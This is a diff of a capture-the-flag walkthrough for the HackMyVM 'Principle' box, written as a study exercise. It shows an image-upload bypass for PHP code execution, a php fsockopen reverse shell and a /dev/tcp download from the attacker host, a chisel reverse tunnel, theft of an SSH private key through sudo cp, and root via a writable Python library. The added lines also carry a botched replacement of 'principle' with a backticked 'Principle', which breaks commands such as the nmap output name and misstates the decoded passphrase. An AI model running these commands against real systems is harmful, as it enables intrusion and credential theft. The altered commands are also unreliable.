@@ -6,14 +6,14 @@ tags: [hackmyvm, walkthrough, hmv, virtualhost, form abuse, rbash escape, sudoer
 img_path: /assets/img/posts/
 ---
 
-Lastly I've been acting (gladly) as beta tester for my friend Kaian.
-Kaian did the Principle box for HackMyVm and I was one of the chosen to test it.
-It was a very fun machine and it was a great experience help to do it.
-I have to say that there is A LOT of work behind each one of this little machines.
+Lastly I've been acting (gladly) as beta tester for my friend [Kaian](https://kaianperez.github.io).
+[Kaian](https://kaianperez.github.io) did the Principle box for [HackMyVm](https://hackmyvm.eu/) and I was one of the chosen to test it.
+It was a very fun machine and it was a great experience help him to do it.
+I have to say that there is **A LOT** of work behind each one of this little machines.
 
-Although Principle is an easy level machine, I have to admit that I learned a few things along the way.
+Although `Principle` is an easy level machine, I have to admit that I learned a few things along the way.
 
-And, as I completed the box, I have earned the right to write the path I followed to complete it ;)
+And, as I completed the box, I have earned the right to write my walkthrough ;)
 
 # Annotations
 
@@ -21,7 +21,7 @@ And, as I completed the box, I have earned the right to write the path I followe
 >
 >Local machine (attacker, local host): 10.0.0.1
 >
->Target machine (victim, Principle box): 10.0.0.2
+>Target machine (victim, `Principle` box): 10.0.0.2
 {: .prompt-info}
 
 # Enumeration
@@ -29,20 +29,20 @@ And, as I completed the box, I have earned the right to write the path I followe
 We are going to scan the target machine to find out what services are running:
 
 ```
-$ nmap -P0 -n -p- -sV -T5 -oA nmap_principle 10.0.0.1
+$ nmap -P0 -n -p- -sV -T5 -oA nmap_`Principle` 10.0.0.1
 ```
 
 ```
 80/tcp open  http    nginx 1.22.1
 ```
 
-We can see that the target has a ngxinx 1.22.1 server running on port 80.
+We can see that the target has a nginx 1.22.1 server running on port 80.
 
 # Web footprinting
 
 If we browse to the target we can see the nginx default welcome page:
 
-![nginx welcome page](hmv-principle-nginx-default-welcome-page.png)
+![nginx welcome page](hmv-`Principle`-nginx-default-welcome-page.png)
 *nginx welcome page*
 
 ## Directory enumeration
@@ -73,7 +73,7 @@ The `hi.html` does not throw us anything interesting.
 
 If we browse to `view-source:http://10.0.0.2/investigate/` we can see a web:
 
-![/investigate](hmv-principle-investigate.png)
+![/investigate](hmv-`Principle`-investigate.png)
 */investigate*
 
 If we take a look at the source code we can see the following comment:
@@ -86,9 +86,7 @@ Let's look for hidden resources in `investigate`:
 
 ```
 $ gobuster dir -u http://10.0.0.2/investigate -w /opt/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404 -x php,txt,html
-```
 
-```
 /index.html           (Status: 200) [Size: 812]
 /rainbow_mystery.txt  (Status: 200) [Size: 596]
 ```
@@ -134,7 +132,7 @@ $ echo "10.0.0.2 T4L0S.HMV" | sudo tee -a /etc/hosts
 
 If we browse to `t4l0s.hmv` we can see a new web:
 
-![t4l0s.hmv](hmv-principle-t4l0s-hmv.png)
+![t4l0s.hmv](hmv-Principle-t4l0s-hmv.png)
 *t4l0s.hmv*
 
 ## Source code
@@ -150,14 +148,12 @@ If we check the source code we find an interesting comment:
 Let's search virtual hosts here:
 
 ```
-$ gobuster vhost -u t4l0s.hmv -r -w /opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
-```
+$ gobuster vhost --append-domain -u t4l0s.hmv -r -w /opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 
-```
 Found: hellfire.t4l0s.hmv Status: 200 [Size: 1659]
 ```
 
-Ok, so, we have a new host and we have to add it to our `/etc/hosts`:
+Ok, we have a new host and we have to add it to our `/etc/hosts`:
 
 ```
 $ echo "10.0.0.2 hellfire.t4l0s.hmv" | sudo tee -a /etc/hosts
@@ -167,7 +163,7 @@ $ echo "10.0.0.2 hellfire.t4l0s.hmv" | sudo tee -a /etc/hosts
 
 If we browse to our new domain we have a new web.
 
-![hellfire.t4l0s.hmv](hmv-principle-hellfire-t4l0s.png)
+![hellfire.t4l0s.hmv](hmv-`Principle`-hellfire-t4l0s.png)
 *hellfire.t4l0s.hmv*
 
 ## Source code
@@ -184,9 +180,7 @@ We will search for hidden files or directories:
 
 ```
 $ gobuster dir -u http://hellfire.t4l0s.hmv --wordlist /opt/wordlists/dirb/common.txt -b 403,404 -x php,txt,html
-```
 
-```
 /index.php            (Status: 200) [Size: 1659]
 /upload.php           (Status: 200) [Size: 748]
 /output.php           (Status: 200) [Size: 1350]
@@ -196,12 +190,12 @@ $ gobuster dir -u http://hellfire.t4l0s.hmv --wordlist /opt/wordlists/dirb/commo
 The interesting resource, here, is `upload.php`.
 If we browse to `http://hellfire.t4l0s.hmv/upload.php` we have a web from which we can upload an image.
 
-![automata photo upload](hmv-principle-automata-photo-upload.png)
+![automata photo upload](hmv-Principle-automata-photo-upload.png)
 *automata photo upload*
 
 We can upload images, so we have to find out if we can exploit this page to gain access to the box.
 
-![image uploaded](hmv-principle-automata-image-uploaded.png)
+![image uploaded](hmv-Principle-automata-image-uploaded.png)
 *image uploaded*
 
 We will try to upload a php file to see if we can do a remote code execution (RCE).
@@ -213,20 +207,20 @@ We create a new php file with the following content:
 
 It seems that the web performs checks on the uploaded files and that only images can be uploaded.
 
-![The file must be an image](hmv-principle-the-file-must-be-an-image.png)
+![The file must be an image](hmv-Principle-the-file-must-be-an-image.png)
 *The file must be an image*
 
 Let's open `burp` and try to dodge the restrictions.
 We configure burp as our proxy and intercept the requests.
 We will modify the upload request, and we will change the `Content-Type` from `application/x-php` to `image/jpeg`:
 
-![Content-Type: application/x-php](hmv-principle-content-type-application-x-php.png)
+![Content-Type: application/x-php](hmv-Principle-content-type-application-x-php.png)
 *Content-Type: application/x-php*
 
-![Content-Type: image/jpeg](hmv-principle-content-type-image-jpeg.png)
+![Content-Type: image/jpeg](hmv-Principle-content-type-image-jpeg.png)
 *Content-Type: image/jpeg*
 
-Once our RCE (remote code execution) test is uploaded we can see that we can perform a RCE:
+Once our RCE (Remote Code Execution) test is uploaded we can see that we can perform a RCE:
 
 ```
 $ curl "http://hellfire.t4l0s.hmv/archivos/rcetest.php" 
@@ -303,11 +297,8 @@ $ ls -la find
 ```
 
 So when we use `find` we are using it as the user `talos`.
-We can take advantage of this and obtain a shell as `talos` user escaping `find`:
+We can take advantage of this abusing the binary.
 
-```
-$ find . -exec /bin/sh \; quit
-```
 
 If we check `/home/talos` we find a note:
 
@@ -316,6 +307,8 @@ $ ls -la /home/talos
 
 -rw-r----- 1 talos talos  320 Jul 13 15:42 note.txt
 ```
+
+We abuse `find` to read `note.txt`:
 
 ```
 $ find . -exec cat /home/talos/note.txt \; -quit
@@ -351,27 +344,26 @@ Now we can be `talos`:
 $ su - talos
 ```
 
-So, let's see what we can do:
+Let's see what we can do:
 
 ```
-talos@principle:~$ sudo -l
-Matching Defaults entries for talos on principle:
+talos@`Principle`:~$ sudo -l
+Matching Defaults entries for talos on `Principle`:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
     use_pty
 
-User talos may run the following commands on principle:
+User talos may run the following commands on `Principle`:
     (elohim) NOPASSWD: /bin/cp
 ```
 
 ### First flag
 
 Now, we can use `/bin/cp` as `elohim`.
-
 Let's see what we can find in `/home/gehenna`:
 
 ```
-talos@principle:~$ ls -la /home/gehenna/
+talos@`Principle`:~$ ls -la /home/gehenna/
 total 40
 drwxr-xr-x 4 elohim elohim 4096 Jul 14 11:25 .
 drwxr-xr-x 4 root   root   4096 Jul  4 06:11 ..
@@ -385,20 +377,20 @@ drw-r----- 3 elohim elohim 4096 Jul  2 20:52 .local
 drwx------ 2 elohim elohim 4096 Jul  6 11:05 .ssh
 ```
 
-So we can get our first flag:
+We can get our first flag:
 
 ```
-talos@principle:/bin$ sudo -u elohim /bin/cp /home/gehenna/flag.txt /dev/stdout
+talos@`Principle`:/bin$ sudo -u elohim /bin/cp /home/gehenna/flag.txt /dev/stdout
 ```
 
 `lock` seems an interesting file, above all after the hint that `talos` give us:
 
 >he keeps the lock coded and hidden at home
 
-So we save a copy of the file in our home:
+So we print the file content and keep a copy of in our machine:
 
 ```
-talos@principle$ sudo -u elohim /bin/cp /home/gehenna/.lock /dev/stdout
+talos@`Principle`$ sudo -u elohim /bin/cp /home/gehenna/.lock /dev/stdout
 ```
 
 Another interesting directory is `.ssh`.
@@ -415,10 +407,10 @@ $ sudo -u elohim /bin/cp /home/gehenna/.ssh/authorized_keys /dev/stdout
 $ sudo -u elohim /bin/cp /home/gehenna/.ssh/id_rsa /dev/stdout
 ```
 
-And we save these files.
+And we save in our machine the content of these files too.
 
 We also can see some interesting information gossiping the `.bashrc` and `.bash_history` files.
-We can see that `elohim` wrote in the python subprocess library:
+We can see that `elohim` edited the python subprocess library:
 
 ```
 nano /usr/lib/python3.11/subprocess.py
@@ -458,7 +450,7 @@ There is a ssh service running. Now we have to find in which port:
 
 ```
 $ ss -tunel
-talos@principle:~/.ssh$ ss -tunel
+talos@`Principle`:~/.ssh$ ss -tunel
 Netid          State           Recv-Q           Send-Q                     Local Address:Port                     Peer Address:Port          Process                                                                
 udp            UNCONN          0                0                                0.0.0.0:68                            0.0.0.0:*              ino:14407 sk:1 cgroup:/system.slice/ifup@enp0s3.service <->           
 tcp            LISTEN          0                128                              0.0.0.0:3445                          0.0.0.0:*              ino:14524 sk:2 cgroup:/system.slice/ssh.service <->
@@ -472,8 +464,8 @@ And, for this, we are going yo use `chisel`.
 We need to know the machine architecture to know what chisel binary upload:
 
 ```
-talos@principle:~/.ssh$ uname -a
-Linux principle 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64 GNU/Linux
+talos@`Principle`:~/.ssh$ uname -a
+Linux `Principle` 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64 GNU/Linux
 ```
 
 We already knew that it was a linux machine, and now, we also know that it has an amd64 architecture, so we need to upload the linux_amd64 binary.
@@ -484,13 +476,13 @@ We start the file transfer on our host:
 $ nc -lvnp 443 < chisel_1.8.1_linux_amd64
 ```
 
-And we start receiving the file in the Principle machine:
+And we start receiving the file in the `Principle` machine:
 
 ```
 $ cat > chisel < /dev/tcp/10.0.0.1/443
 ```
 
-We have to give execution permissions to the `chisel` binary in the Principle machine:
+We have to give execution permissions to the `chisel` binary in the `Principle` machine:
 
 ```
 $ chmod 700 chisel
@@ -503,7 +495,7 @@ We will establish the `chisel` server in our host:
 $ /chisel_1.8.1_linux_amd64 server --reverse -p 8080
 ```
 
-And we start the `chisel` client in the Principle machine:
+And we start the `chisel` client in the `Principle` machine:
 
 ```
 $ ./chisel client 10.0.0.1:8080 R:22222:127.0.0.1:3445
@@ -515,7 +507,7 @@ So we can connect via ssh using a private key, we need to give it the right perm
 $ chmod 600 elohim_id_rsa
 ```
 
-To connect to Principle via our reverse proxy we need to connect to the reverse proxy running on our host:
+To connect to `Principle` via our reverse proxy we need to connect to the reverse proxy running on our host:
 
 ```
 $ ssh elohim@localhost -p22222 -i elohim_id_rsa
@@ -531,8 +523,8 @@ Don't worry, rember the words of `talos`:
 This is where the `.lock` file will be useful.
 
 The file content is: `7072696e6369706c6573`, and we know that is encoded.
-It's encoded in hexadecimal, if we decode it we obtain: `principles`, and this is this passphrase.
-Now we can connect via ssh to the Principle machine.
+It's encoded in hexadecimal, if we decode it we obtain: ``Principle`s`, and this is this passphrase.
+Now we can connect via ssh to the `Principle` machine.
 
 ```
 $ ssh elohim@localhost -p22222 -i elohim_id_rsa
@@ -545,7 +537,7 @@ We are already inside and we are `elohim`
 ## elohim
 
 ```
-elohim@principle:~$ id
+elohim@`Principle`:~$ id
 uid=1001(elohim) gid=1001(elohim) groups=1001(elohim),1002(sml)
 ```
 
@@ -553,10 +545,10 @@ Interesting, we are part from the `sml` group.
 Let's see what we can do with `sudo`:
 
 ```
-Matching Defaults entries for elohim on principle:
+Matching Defaults entries for elohim on `Principle`:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
 
-User elohim may run the following commands on principle:
+User elohim may run the following commands on `Principle`:
     (root) NOPASSWD: /usr/bin/python3 /opt/reviewer.py
 ```
 
@@ -565,7 +557,7 @@ So, we need to escape from the `rbash`.
 We can escape from the `rbash` and get a `bash` shell using php:
 
 ```
-elohim@principle:~$ php -r '$sock=fsockopen("10.0.0.1",4545);exec("/bin/bash -i <&3 >&3 2>&3");'
+elohim@`Principle`:~$ php -r '$sock=fsockopen("10.0.0.1",4545);exec("/bin/bash -i <&3 >&3 2>&3");'
 ```
 
 To move confortably we will disable the following restricted aliases:
@@ -575,15 +567,14 @@ $ unalias cat
 $ unalias vi
 ```
 
-If we check the `reviwer.py` script, we can see that we don't have permissions to write it:
+If we check the `reviwer.py` script, we can see that we don't have permissions to write it, but we can read it:
 
 ```
-elohim@principle:~$ ls -la /opt/
+elohim@`Principle`:~$ ls -la /opt/
 
 -rwxr-xr-x  1 root root 1072 Jul  7 15:17 reviewer.py
 ```
 
-But we can read it.
 And we can see that the `reviewer.py` script file is using the following libraries:
 
 ```python
@@ -600,7 +591,7 @@ nano /usr/lib/python3.11/subprocess.py
 Let's check the library permissions:
 
 ```
-elohim@principle:~$ ls -la /usr/lib/python3.11/subprocess.py
+elohim@`Principle`:~$ ls -la /usr/lib/python3.11/subprocess.py
 -rw-rw-r-- 1 root sml 85745 Jul 11 19:04 /usr/lib/python3.11/subprocess.py
 ```
 
@@ -624,6 +615,5 @@ $ sudo /usr/bin/python3 /opt/reviewer.py
 ```
 
 And we can read our last flag!
-```
 
 *Enjoy! ;)*
